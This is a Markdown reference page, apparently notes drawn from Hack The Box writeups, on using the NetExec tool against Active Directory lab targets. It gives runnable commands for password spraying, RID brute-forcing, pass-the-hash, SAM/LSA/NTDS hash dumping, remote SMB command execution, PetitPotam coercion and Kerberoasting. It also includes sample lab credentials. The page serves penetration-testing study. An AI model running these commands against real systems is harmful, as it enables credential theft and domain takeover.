---
title: "NetExec"
type: tool
tags: [active-directory, brute-force, enumeration, mssql, rdp, smb, ssh, windows]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [0xdf-tools-netexec]
---

## Purpose

**NetExec** (`nxc`) is the community successor to CrackMapExec, used for authenticated and unauthenticated enumeration, credential testing, password spraying, and remote execution across SMB, WinRM, LDAP, MSSQL, RDP, SSH, and FTP.

## Install / setup

```bash
pipx install netexec
```

The binary is `netexec`, with `nxc` as an alias. Config and module output are stored under `~/.nxc/`. The tool was formerly called CrackMapExec (`cme`); writeups from 2023 and earlier often show `crackmapexec` in place of `netexec`.

## Core usage

```
netexec <protocol> <target> [options]
```

**Protocols:** `smb`, `winrm`, `ldap`, `mssql`, `rdp`, `ssh`, `ftp`

### Common flags

| Flag | Description |
|---|---|
| `-u` | Username or file of usernames |
| `-p` | Password or file of passwords |
| `-H` | NT hash (pass-the-hash) |
| `-d` | Domain |
| `--local-auth` | Authenticate with a local account instead of domain account |
| `-k` | Use Kerberos authentication |
| `--continue-on-success` | Do not stop after the first successful auth (spray mode) |
| `--no-bruteforce` | Try each user only with the matching password at the same list index |
| `-x` | Execute a command via SMB (RCE) |
| `-X` | Execute a PowerShell command via SMB |
| `--exec-method` | Force a specific execution method: `wmiexec`, `smbexec`, `atexec`, `mmcexec` |
| `-M <module>` | Load a module |
| `-o KEY=VAL` | Pass options to a module |

### Output indicators

- `[+]` and no trailing annotation: valid credentials, no special access
- `(Pwn3d!)`: user has local admin rights (SMB) or can connect to WinRM
- `[-]`: authentication failed
- `[*]`: informational message

## Common use cases

### Hosts file generation

```bash
# Write the hostname and domain to /etc/hosts
netexec smb 10.10.11.42 --generate-hosts-file /etc/hosts
```

Saves scanning manually. As of November 2024, `netexec` will update the hosts file directly rather than requiring manual processing.

### Credential validation across protocols

```bash
# Test SMB
netexec smb dc.example.htb -u olivia -p ichliebedich

# Test WinRM — (Pwn3d!) means Evil-WinRM will work
netexec winrm dc.example.htb -u olivia -p ichliebedich

# Test with NT hash (pass-the-hash)
netexec smb dc.example.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

# Test with local admin hash (--local-auth skips domain lookup)
netexec smb dc.example.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e --local-auth
```

### SMB: null session and guest enumeration

```bash
# Check if guest auth is enabled
netexec smb dc.example.htb -u guest -p ''

# Attempt unauthenticated share listing
netexec smb dc.example.htb -u '' -p '' --shares
```

### SMB: share enumeration

```bash
netexec smb dc.example.htb -u olivia -p ichliebedich --shares
```

### SMB: file spidering

Saves share contents metadata to `~/.nxc/modules/nxc_spider_plus/<ip>.json`. Readable with `jq`.

```bash
netexec smb dc.example.htb -u guest -p '' -M spider_plus
```

### SMB: user enumeration

```bash
# List users via samr
netexec smb dc.example.htb -u olivia -p ichliebedich --users

# RID brute-force when --users fails (works with guest/null session)
netexec smb dc.example.htb -u guest -p '' --rid-brute

# Pipe RID brute results to a username list
netexec smb dc.example.htb -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt
```

### SMB: password spray

```bash
# Spray one password against many users
netexec smb dc.example.htb -u users.txt -p 'Welcome1' --continue-on-success

# Test username=password (no bruteforce: pair index-for-index)
netexec smb dc.example.htb -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

### SMB: password policy

```bash
netexec smb dc.example.htb -u olivia -p ichliebedich --pass-pol
```

Important to check before spraying to avoid lockouts.

### SMB: change a user's password

```bash
# Requires the account's current password (even if STATUS_PASSWORD_MUST_CHANGE)
netexec smb dc.example.htb -u caroline -p 'OldPass1!' -M change-password -o NEWPASS='NewPass123!'
```

### SMB: hash/credential dumping

```bash
# Dump local SAM hashes (requires local admin)
netexec smb dc.example.htb -u administrator -H <hash> --sam

# Dump LSA secrets (requires local admin)
netexec smb dc.example.htb -u administrator -H <hash> --lsa

# Dump NTDS (domain admin required on DC)
netexec smb dc.example.htb -u 'DC$' -H <hash> --ntds
```

### SMB: remote command execution

```bash
# Execute a command (default: wmiexec)
netexec smb dc.example.htb -u administrator -H <hash> -x 'whoami'

# Force a specific exec method
netexec smb dc.example.htb -u administrator -H <hash> --exec-method smbexec -x 'whoami'
```

### SMB: coercion vulnerability check

```bash
# Check which coercion methods work (useful for ESC8 / relay attacks)
netexec smb dc.example.htb -u rosie -p Cicada123 -k -M coerce_plus

# Trigger PetitPotam coercion to a specific listener
netexec smb dc.example.htb -u rosie -p Cicada123 -k -M coerce_plus -o LISTENER=<listener_hostname> METHOD=PetitPotam
```

### WinRM: credential test and shell check

```bash
netexec winrm dc.example.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

`(Pwn3d!)` confirms Evil-WinRM will connect. No Pwn3d! means valid creds but no WinRM access for that user.

### RDP: credential test

```bash
netexec rdp dc.example.htb -u svc_mssql -p Trustno1
```

`[+]` without `(Pwn3d!)` means the creds are valid but the user is not allowed to connect via RDP. `(Pwn3d!)` means an RDP session can be opened.

### LDAP: basic connectivity and credential test

```bash
netexec ldap dc.example.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

### LDAP: ASREPRoasting

```bash
# Dump AS-REP hashes to a file (no auth required if DONT_REQ_PREAUTH is set on the account)
netexec ldap dc.example.htb -u svc_scan -p '' --asreproast svc_scan.asreproast
```

Pass the output file directly to hashcat (mode 18200).

### LDAP: Kerberoasting

```bash
# Dump TGS hashes for all Kerberoastable accounts
netexec ldap dc.example.htb -u julia.wong -p Computer1 --kerberoast kerberoast_hashes.txt
```

Pass the output file to hashcat (mode 13100).

### LDAP: BloodHound collection

```bash
netexec ldap dc.example.htb -u library -p library --bloodhound -c All --dns-server 10.129.194.134
```

Collects all BloodHound data via LDAP and zips it for import into BloodHound CE.

### LDAP: custom LDAP queries

```bash
# Enumerate all objects
netexec ldap dc.example.htb -u '' -p '' --query "(objectClass=*)" ""

# Enumerate user objects
netexec ldap dc.example.htb -u '' -p '' --query "(sAMAccountName=*)" ""
```

### LDAP: MachineAccountQuota

```bash
netexec ldap dc.example.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ
```

Shows whether low-privilege users can add computer accounts to the domain (default quota is 10). Required for attacks like ESC1 via a created machine account.

### MSSQL: credential test

```bash
netexec mssql dc.example.htb -u svc_mssql -p Trustno1
```

### FTP: credential test

```bash
netexec ftp dc.example.htb -u benjamin -p 0xdf0xdf.
```

### SSH: credential test and spray

```bash
netexec ssh target.example.htb -u users.txt -p FoundPassword --continue-on-success
```

## Tips and gotchas

**Clock skew with Kerberos:** When using `-k` for Kerberos authentication, the attacker machine clock must be within 5 minutes of the DC. Use `sudo ntpdate <DC_IP>` to sync. Clock skew usually manifests as `KRB_AP_ERR_SKEW` during authentication.

**CA name format for `-M MAQ`:** The MAQ module uses LDAP, not SMB. Pass the DC IP directly rather than the domain name when there are DNS resolution issues.

**RDP "green but no Pwn3d!":** A `[+]` on RDP without `(Pwn3d!)` means the credentials are valid but the account does not have RDP logon rights. The distinction is useful for confirming credentials without implying shell access.

**`spider_plus` output location:** Results are saved to `~/.nxc/modules/nxc_spider_plus/<target_ip>.json`. Parse with `jq ':  .ShareName | to_entries[] | .key'` to list files per share.

**`--continue-on-success` is essential for spraying:** Without it, `netexec` stops after the first match. Always include it when spraying a list of users so all valid accounts are returned.

**`--no-bruteforce` for username=password checks:** When testing whether any users have their username as their password, pair the same list for both `-u` and `-p` with `--no-bruteforce`. This tests `user[0]:pass[0]`, `user[1]:pass[1]`, etc., rather than every combination.

**STATUS_PASSWORD_MUST_CHANGE:** When SMB returns this error, the password is correct but must be changed before first use. Use the `change-password` module to update it without needing a Windows session.

**Kerberos-only DCs:** Some environments disable NTLM (seen in boxes like Absolute and VulnCicada). Use `-k` with a valid Kerberos ticket in `KRB5CCNAME` environment variable, or obtain a TGT first with `kinit`.

**`--generate-hosts-file` appends, not replaces:** The flag appends a new line to the specified hosts file. Check for duplicate entries if you run it multiple times.

**`netexec winrm` vs `netexec smb` for admin check:** `(Pwn3d!)` on WinRM means the user is in the Remote Management Users group. `(Pwn3d!)` on SMB means local administrator rights. These are different checks.

## Related techniques

- [[pass-the-hash]]
- [[ad-enumeration]]
- [[authentication-attacks]]
- [[ad-lateral-movement]]
- [[password-cracking]]

## Sources

- 0xdf HTB writeups: administrator, authority, axlle, baby, babytwo, blackfield, blazorized, bookworm, breach, bruno, analysis, certified, vulncicada
